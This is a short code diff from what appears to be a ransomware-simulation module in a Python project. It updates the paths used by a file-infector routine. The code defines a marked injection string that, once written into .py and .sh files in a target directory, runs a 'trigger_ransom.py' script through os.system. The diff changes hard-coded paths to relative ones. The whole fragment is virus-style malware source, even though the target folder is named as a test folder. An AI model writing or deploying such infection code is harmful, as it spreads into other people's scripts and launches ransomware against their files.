@@ -2,14 +2,16 @@
 import os
 import subprocess
 
+BASE_DIR = os.path.abspath(os.path.dirname(__file__))
+SCRIPT_PATH = os.path.join(BASE_DIR, "simulation", "trigger_ransom.py")
+
 INFECTION_MARKER = "#infected"
 INJECTION_CODE = (
     f"{INFECTION_MARKER}\n"
     "import os\n"
-    "os.system('python3 /home/korban/ByteMeProject/backend/src/modules/simulation/trigger_ransom.py')\n"
+    f"os.system('python3 {SCRIPT_PATH}')\n"
 )
-
-TARGET_DIR = "/home/korban/Desktop/TestInfected"
+TARGET_DIR = os.path.join(BASE_DIR, "..", "tmp", "TestInfected")
 TARGET_EXTENSIONS = ['.py', '.sh']
 
 def is_infected(content):
